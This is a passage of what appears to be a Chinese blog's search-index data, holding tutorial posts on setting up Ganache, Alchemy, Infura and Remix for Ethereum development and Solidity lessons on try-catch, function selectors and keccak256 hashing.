evm_increaseTime 和 evm_setTime ）来推进区块链上的时间。 大多数情况下我们无法等到这个时间，我们可以使用 evm_increaseTime 将区块链当前时间戳增加指定的时间量（以秒为单位）（以十六进制格式传入）。这将返回以毫秒为单位调整的总时间。 curl -H 'Content-Type: application/json' --data' {\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"evm_increaseTime\", \"params\": [\"0x15180\"] }' http://localhost:8545 此外，您可以使用 evm_setTime 将其设置为特定的时间戳；它接受具有毫秒精度的 JavaScript 时间戳，并返回给定时间戳和当前时间之间的秒数。 这里有个在项目中应用的案例（很实用）：liquity 项目合约测试 - ForwardTime 的功能实现 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:5","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"通过GUI使用 Ganache 不太推荐，如果你是新上手，可以通过这个快速熟悉 Ganache。 点击下载Ganache - Truffle Suite 客户端界面 初始化新建工作空间 点击quickstart就可以快速启动，但是快速启动默认的网络端口是 7545，如果你用remix链接的时候需要修改一下。启动完成之后就如下图所示： 第一行可以看到你现在的网络rpc server, 默认是地址和端口是127.0.0.1:7545，如果你在remix中使用默认的，需要把端口改为7545。 remix 链接默认ganache 选择环境为 ganache provider，具体端口看你的设置,需要跟ganache的端口一致。 端口改为和本地ganache默认一样的7545 测试部署一个合约 这里能看到区块里的交易信息，显示我部署了一个合约地址。 自定义配置 有时候你可能需要自定义配置，比如你的网络端口，或者你需要fork主网，你可以在初始化空间的时候配置。 选择new workspace 设置端口和网络ID 端口：可以将默认端口7545改成8545，看你的习惯 fork主网 这里的地址填入你alchemy（或者Infura）的的主网地址即可 没有的话申请一个 Alchemy - Blockchain APIs and Node Infrastructure 。 在chain forking下面的ENTER CUSTOM URL里面填入你的eth mainnet地址即可 设置固定账号和余额 最后点击 save workspace 就可以启动啦。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:6","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"web3js/ethersjs 链接 ganache ganache生成的本地rpc地址为 127.0.0.1:8545 UI的默认地址和命令行有区别，所以我上述做了变更。像remix默认使用的就是8454端口 // web3js const web3 = new Web3(Web3.givenProvider || \"http://127.0.0.1:8545\"); // ethersjs const provider = new ethers.providers.JsonRpcProvider(\"http://127.0.0.1:8545\"); ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:4:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"remix链接本地ganache 把环境链接修改为 ganache即可没，这样你就可以把他部署在你本地的eth网络环境上了。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:5:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"测试部署合约 这里就将合约部署在了我们本地运行的ganache上。 命令行会输出部署的相应细节 可以看到部署成功之后，可以方便的调用各种方法 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:5:1","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"部署合约，查询v神余额 这个合约写了一个可以查询eth余额的方法，因为我们fork了主网，所以查询一下v神在我们本地测试网络的余额，应该和主网的余额是一样的。 // contracts/GLDToken.sol† // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract XBXToken { function getETHBalance(address _address) view external returns(uint256) { return address(_address).balance; } } v神主网钱包地址 通过remix调用查看fork之后，本地部署该地址余额 本地fork的网络查询v神余额与主网上的余额一致，fork主网测试成功。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:5:2","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"总结 至此我们就完整fork了一个主网，为下一步做合约开发搭建好了必要的本地环境。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:6:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"Alchemy是什么 Alchemy 超级节点是 Ethereum、Polygon、Solana、Arbitrum、Optimism、Flow 和 Crypto.org 使用最广泛的区块链 API。获得节点的所有功能，包括 JSON-RPC 支持，但具有在区块链上运行世界级应用程序所需的超强可靠性、数据准确性和可扩展性。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:1:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"连接应用和区块链 在以太坊上开发的Dapp应用（链下）需要与区块链（链上）交互。早期，以太坊上的基础设施很少，开发者需要在本地部署以太坊节点来完成链下和链上的交互，非常麻烦，且耗时数日。 Alchemy 和 Infura在链下、链上之间搭了一座桥，让两者的交互变的简单。它为用户提供对以太坊和IPFS网络的即时、可扩展的API访问。开发者在Alchemy 和 Infura官网注册后，就可以免费申请的以太坊API KEY，就可以利用它们的节点与区块链交互。另外，小狐狸metamask钱包内置了Infura服务，方便用户访问以太坊网络。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:2:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"Alchemy 和 Infura 的区别 左边是alchemy 右边是 Infura，我们来对比下免费的套餐 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:3:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"访问量的区别 Alchemy每天没有访问限制，Infura每天有100,000的访问限制。 Alchemy每个月有300,000,000的访问量，Infura每个月有3,000,000的访问量。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:3:1","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"支持公链的区别（免费版本） Alchemy支持：ETH、Polygon、Solana、Arbitrum、Optimism Infura支持：ETH、ETH2、IPFS、Filecoin ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:3:2","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"Alchemy支持enhanced-apis Alchemy自己封装了一些web3的api，大家可以自己看文档获取更多的细节。 Alchemy - enhanced-apis ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:3:3","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"创建Alchemy API Key ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"1. 打开Alchemy官网并注册 网址：alchemy.com ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:1","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"2. 创建API Key 注册后，进入控制台Dashboard，并点击右上角的 + CREATE APP 按钮。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:2","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"3. 填写API Key信息 CHAIN：选择你需要的网络，如果是以太网就是 Ethereum。 NETWORK:并选择是主网还是测试网。 填写完成之后点击 CREATE APP 即可创建。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:3","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"4. API Key创建完毕 回到控制台Dashboard，可以看到名为WTFSolidity的API Key已经创建完毕。在控制台Dashboard，点击 view key 按钮，可以查看API Key详情。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:4","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"5. 查看API Key详情 可以看到我们创建好了相应的api key，最常用的https和websockets都支持。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:4:5","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"使用Alchemy API Key ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:5:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"Javascript (ethers.js) 在ether.js中，我们可以利用Alchemy API Key来创建JsonRpcProvider，与链上交互。 const { ethers } = require(\"ethers\"); // 填上你的Alchemy API Key const ALCHEMY_ID = '' const provider = new ethers.providers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_ID}`) ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:5:1","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"Metamask小狐狸钱包 进入小狐狸钱包设置 Setting 页面，点击网络 Netowrk，点击添加网络 Add Network。你可以利用下面的参数在小狐狸中添加Alchemy 的eth链： 网络名称（Network Name）: Alchemy-eth RPC URL：填在alchemy申请的optimism rpc链接 链ID (Chain ID): 1 符号 (Chain Symbol): ETH 区块链浏览器URL (Blockchain Explorer URL): https://etherscan.io ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:5:2","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":"总结 如何创建并使用Alchemy API Key便捷访问以太坊区块链。 ","date":"2022-03-20","objectID":"/posts/tools-alchemy-introduce.html:6:0","tags":["tools"],"title":"Alchemy, 区块链API和节点基础设施","uri":"/posts/tools-alchemy-introduce.html"},{"categories":["工具"],"content":" 引言 Infura是Consensys(小狐狸钱包母公司)开发的区块链基础设施，帮助用户/开发者更好的与以太坊区块链交互。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:0:0","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"连接应用和区块链 在以太坊上开发的Dapp应用（链下）需要与区块链（链上）交互。早期，以太坊上的基础设施很少，开发者需要在本地部署以太坊节点来完成链下和链上的交互，非常麻烦，且耗时数日。 Infura在链下、链上之间搭了一座桥，让两者的交互变的简单。它为用户提供对以太坊和IPFS网络的即时、可扩展的API访问。开发者在Infura官网注册后，就可以免费申请的以太坊API KEY，就可以利用Infura的节点与区块链交互。另外，小狐狸metamask钱包内置了Infura服务，方便用户访问以太坊网络。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:1:0","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"创建Infura API Key ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:0","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"1. 打开Infura官网并注册 网址：infura.io ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:1","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"2. 创建API Key 注册后，进入控制台Dashboard，并点击右上角的 CREATE NEW KEY 按钮。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:2","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"3. 填写API Key信息 NETWORK选择 Web3 API (Formerly Ethereum)，有的版本这里显示的是Ethereum，NAME随便填一个，我填的WTF，之后点击CREATE按钮。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:3","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"4. API Key创建完毕 回到控制台Dashboard，可以看到名为WTF的API Key已经创建完毕。在控制台Dashboard，点击 MANAGE KEY 按钮，可以查看API Key详情。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:4","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"5. 查看API Key详情 进入API Key详情页，我们可以看到我们的API Key（图中184d开头的一组密钥）。在下面的 NETWORK ENDPOINT 栏中，可以查到以太网主网/测试网的rpc节点链接，用于访问链上数据并交互。另外，你可以申请免费的Layer2 rpc节点，包括Polygon，Optimism和Arbitrum，但是需要绑定visa卡。领Optimism空投那次，公开rpc节点卡爆了，而使用Infura的私人rpc节点的人可以正常领取。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:2:5","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"使用Infura API Key ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:3:0","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"Javascript (ethers.js) 在ether.js中，我们可以利用Infura API Key来创建JsonRpcProvider，与链上交互。 const { ethers } = require(\"ethers\"); // 填上你的Infura API Key const INFURA_ID = '' const provider = new ethers.providers.JsonRpcProvider(`https://mainnet.infura.io/v3/${INFURA_ID}`) ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:3:1","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"Metamask 小狐狸钱包 进入小狐狸钱包设置 Setting 页面，点击网络 Netowrk，点击添加网络 Add Network。你可以利用下面的参数在小狐狸中添加Optimism Layer2链： 网络名称（Network Name）: Optimism RPC URL：填在Infura申请的optimism rpc链接 链ID (Chain ID): 10 符号 (Chain Symbol): ETH 区块链浏览器URL (Blockchain Explorer URL): https://optimistic.etherscan.io ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:3:2","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":"总结 如何创建并使用Infura API Key便捷访问以太坊区块链。 ","date":"2022-02-21","objectID":"/posts/tools-infura-introduce.html:4:0","tags":["tools"],"title":"Infura, 连接链下与链上的桥梁","uri":"/posts/tools-infura-introduce.html"},{"categories":["工具"],"content":" 引言 Remix是以太坊官方推荐的智能合约开发IDE，非常易用。Remix让你可以直接在浏览器中快速部署测试智能合约，而不需要安装配置任何程序。这一讲，我们将完整的介绍如何使用Remix部署合约，并调用其中的函数。 Remix官网：remix.ethereum.org ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:0:0","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"打开Remix 打开官网进入Remix，我们可以看到Remix由四个面板组成： 图标面板：上面有代表不同功能的图标，点击后，相应的功能个会显示在侧面版上。 侧面版：各种功能的 GUI。 主面板：代码编辑器。 终端：将显示与 GUI 交互的结果，也可以在此处运行脚本。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:1:0","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"图标面板 图标面板默认有4个图标，其中文件，编译，部署是最常用的。在你添加更多的remix插件后，它们也会显示在图标面板上。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:2:0","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"部署简单合约 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:3:0","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"1 选择合约文件 首先点击文件图标，侧面版会变为文件浏览器。 我们可以在文件浏览器中管理我们的workspace，文件夹和文件。 在contract文件夹下面，有三个remix自带的合约例子，分别是1_Storage.sol, 2_Owner.sol和3_Ballot.sol。 点击1_Storage.sol，代码会显示在主面板的代码编辑器上。这个合约非常简单：它一个状态变量number，在链上存储一个uint256类型的数字；它有两个函数，store()函数将一个数字赋值给number变量；retrieve()展示number变量的数值。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:3:1","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"2 编译 接下来，点击编译图标，进入Solidity Compiler。在这里，我们选择Solidity 0.8.7版本，然后点击Compile 1_Storage.sol按钮进行编译。在合约成功编译后，编译图标上会显示绿色对勾。 你也可以尝试在优化中选在优化（Enable Optimization），次数设置为200，有时会省gas消耗。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:3:2","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"3 部署 下一步，我们要把编译好的合约部署到本地虚拟机或链上。首先点击部署，进入部署界面。 在ENVIRONMENT中，我们可以选择我们部署的环境，默认的是JavaScript VM，所有交易都在本地浏览器的沙盒区块链中执行，使用的是它给你的虚拟钱包地址；你也可以选择Injected Web3，即连接你的metamask钱包，所有交易会在真实的区块链中执行。 这里，我们选择JavaScript VM，你可以在钱包地址（ACCOUNT）栏看到虚拟机给你分配的测试地址。不需要调整Gas，也不用往合约里发送ETH。在CONTRACT栏中选择你要部署的合约Storage。1_Storage.sol文件中只有一个合约，因此默认就是部署它；但当文件包含多个合约时，我们需要手动选择要部署的合约。 点击DEPLOY键，部署完毕！ 注意：如果我们选择的是Injected Web3来部署合约，每一笔交易都将上链，需要钱包确认交易并支付gas。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:3:3","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["工具"],"content":"4 调用 在合约部署成功后，我们可以在Deployed Contracts中找到我们部署的合约Storage。展开它，我们将看到所有的外部函数：store和retrieve。 我们在store函数那行的文本框中输入100，并点击函数名调用它。调用成功后，我们可以在终端上看到log信息，点击Debug按钮可以查看交易详情。 之后，我们调用retrieve函数，显示number变量被成功更新为100。 ","date":"2022-01-22","objectID":"/posts/tools-remix-introduce.html:3:4","tags":["tools"],"title":"Remix, 最易用的Solidity IDE","uri":"/posts/tools-remix-introduce.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 try-catch是现代编程语言几乎都有的处理异常的一种标准方式，solidity0.6版本也添加了它。这一讲，我们将介绍如何利用try-catch处理智能合约中的异常。 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:0:0","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"try-catch 在solidity中，try-catch只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下： try externalContract.f() { // call成功的情况下 运行一些代码 } catch { // call失败的情况下 运行一些代码 } 其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。 同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。 如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。 try externalContract.f() returns(returnType val){ // call成功的情况下 运行一些代码 } catch { // call失败的情况下 运行一些代码 } 另外，catch模块支持捕获特殊的异常原因： try externalContract.f() returns(returnType){ // call成功的情况下 运行一些代码 } catch Error(string memory /*reason*/) { // 捕获revert(\"reasonString\") 和 require(false, \"reasonString\") } catch Panic(uint /*errorCode*/) { // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界 } catch (bytes memory /*lowLevelData*/) { // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支 // 例如revert() require(false) revert自定义类型的error } ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:1:0","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"try-catch实战 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:0","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"OnlyEven 我们创建一个外部合约OnlyEven，并使用try-catch来处理异常： contract OnlyEven{ constructor(uint a){ require(a != 0, \"invalid number\"); assert(a != 1); } function onlyEven(uint256 b) external pure returns(bool success){ // 输入奇数时revert require(b % 2 == 0, \"Ups! Reverting\"); success = true; } } OnlyEven合约包含一个构造函数和一个onlyEven函数。 构造函数有一个参数a，当a=0时，require会抛出异常；当a=1时，assert会抛出异常；其他情况均正常。 onlyEven函数有一个参数b，当b为奇数时，require会抛出异常。 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:1","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"处理外部函数调用异常 首先，在TryCatch合约中定义一些事件和状态变量： // 成功event event SuccessEvent(); // 失败event event CatchEvent(string message); event CatchByte(bytes data); // 声明OnlyEven合约变量 OnlyEven even; constructor() { even = new OnlyEven(2); } SuccessEvent是调用成功会释放的事件，而CatchEvent和CatchByte是抛出异常时会释放的事件，分别对应require/revert和assert异常的情况。even是个OnlyEven合约类型的状态变量。 然后我们在execute函数中使用try-catch处理调用外部函数onlyEven中的异常： // 在external call中使用try-catch function execute(uint amount) external returns (bool success) { try even.onlyEven(amount) returns(bool _success){ // call成功的情况下 emit SuccessEvent(); return _success; } catch Error(string memory reason){ // call不成功的情况下 emit CatchEvent(reason); } } ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:2","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 当运行execute(0)的时候，因为0为偶数，满足require(b % 2 == 0, \"Ups! Reverting\");，没有异常抛出，调用成功并释放SuccessEvent事件。 当运行execute(1)的时候，因为1为奇数，不满足require(b % 2 == 0, \"Ups! Reverting\");，异常抛出，调用失败并释放CatchEvent事件。 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:3","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"处理合约创建异常 这里，我们利用try-catch来处理合约创建时的异常。只需要把try模块改写为OnlyEven合约的创建就行： // 在创建新合约中使用try-catch （合约创建被视为external call） // executeNew(0)会失败并释放`CatchEvent` // executeNew(1)会失败并释放`CatchByte` // executeNew(2)会成功并释放`SuccessEvent` function executeNew(uint a) external returns (bool success) { try new OnlyEven(a) returns(OnlyEven _even){ // call成功的情况下 emit SuccessEvent(); success = _even.onlyEven(a); } catch Error(string memory reason) { // catch失败的 revert() 和 require() emit CatchEvent(reason); } catch (bytes memory reason) { // catch失败的 assert() emit CatchByte(reason); } } ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:4","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 当运行executeNew(0)时，因为0不满足require(a != 0, \"invalid number\");，会失败并释放CatchEvent事件。 当运行executeNew(1)时，因为1不满足assert(a != 1);，会失败并释放CatchByte事件。 当运行executeNew(2)时，因为2满足require(a != 0, \"invalid number\");和assert(a != 1);，会成功并释放SuccessEvent事件。 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:2:5","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 如何在solidity使用try-catch来处理智能合约运行中的异常： 只能用于外部合约调用和合约创建。 如果try执行成功，返回变量必须声明，并且与返回的变量类型相同。 ","date":"2021-12-15","objectID":"/posts/solidity-try-catch.html:3:0","tags":["solidity","basic"],"title":"合约开发中的异常处理Try Catch","uri":"/posts/solidity-try-catch.html"},{"categories":["基础知识","Solidity 进阶"],"content":"selector 当我们调用智能合约时，本质上是向目标合约发送了一段calldata，在remix中发送一次交易后，可以在详细信息中看见input即为此次交易的calldata 发送的calldata中前4个字节是selector（函数选择器）。这一讲，我们将介绍selector是什么，以及如何使用。 ","date":"2021-11-27","objectID":"/posts/solidity-selector.html:1:0","tags":["solidity","basic"],"title":"合约中函数选择器Selector介绍","uri":"/posts/solidity-selector.html"},{"categories":["基础知识","Solidity 进阶"],"content":"msg.data msg.data是solidity中的一个全局变量，值为完整的calldata（调用函数时传入的数据）。 在下面的代码中，我们可以通过Log事件来输出调用mint函数的calldata： // event 返回msg.data event Log(bytes data); function mint(address to) external{ emit Log(msg.data); } 当参数为0x2c44b726ADF1963cA47Af88B284C06f30380fC78时，输出的calldata为 0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78 这段很乱的字节码可以分成两部分： 前4个字节为函数选择器selector： 0x6a627842 后面32个字节为输入的参数： 0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78 其实calldata就是告诉智能合约，我要调用哪个函数，以及参数是什么。 ","date":"2021-11-27","objectID":"/posts/solidity-selector.html:1:1","tags":["solidity","basic"],"title":"合约中函数选择器Selector介绍","uri":"/posts/solidity-selector.html"},{"categories":["基础知识","Solidity 进阶"],"content":"method id、selector和函数签名 method id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？ 其实在第21讲中，我们简单介绍了函数签名，为\"函数名（逗号分隔的参数类型)\"。举个例子，上面代码中mint的函数签名为\"mint(address)\"。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。 注意，在函数签名中，uint和int要写为uint256和int256。 我们写一个函数，来验证mint函数的method id是否为0x6a627842。大家可以运行下面的函数，看看结果。 function mintSelector() external pure returns(bytes4 mSelector){ return bytes4(keccak256(\"mint(address)\")); } 结果正是0x6a627842： ","date":"2021-11-27","objectID":"/posts/solidity-selector.html:1:2","tags":["solidity","basic"],"title":"合约中函数选择器Selector介绍","uri":"/posts/solidity-selector.html"},{"categories":["基础知识","Solidity 进阶"],"content":"使用selector 我们可以利用selector来调用目标函数。例如我想调用mint函数，我只需要利用abi.encodeWithSelector将mint函数的method id作为selector和参数打包编码，传给call函数： function callWithSignature() external returns(bool, bytes memory){ (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, 0x2c44b726ADF1963cA47Af88B284C06f30380fC78)); return(success, data); } 在日志中，我们可以看到mint函数被成功调用，并输出Log事件。 ","date":"2021-11-27","objectID":"/posts/solidity-selector.html:1:3","tags":["solidity","basic"],"title":"合约中函数选择器Selector介绍","uri":"/posts/solidity-selector.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 哈希函数（hash function）是一个密码学概念，它可以将任意长度的消息转换为一个固定长度的值，这个值也称作哈希（hash）。 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:0:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Hash的性质 一个好的哈希函数应该具有以下几个特性： 单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。 灵敏性：输入的消息改变一点对它的哈希改变很大。 高效性：从输入的消息到哈希的运算高效。 均一性：每个哈希值被取到的概率应该基本相等。 抗碰撞性： 弱抗碰撞性：给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。 强抗碰撞性：找到任意x和x'，使得hash(x) = hash(x')是困难的。 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:1:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Hash的应用 生成数据唯一标识 加密签名 安全加密 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:2:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Keccak256 Keccak256函数是solidity中最常用的哈希函数，用法非常简单： 哈希 = keccak256(数据); ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:3:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Keccak256和sha3 这是一个很有趣的事情： sha3由keccak标准化而来，在很多场合下Keccak和SHA3是同义词，但在2015年8月SHA3最终完成标准化时，NIST调整了填充算法。所以SHA3就和keccak计算的结果不一样，这点在实际开发中要注意。 以太坊在开发的时候sha3还在标准化中，所以采用了keccak，所以Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的。 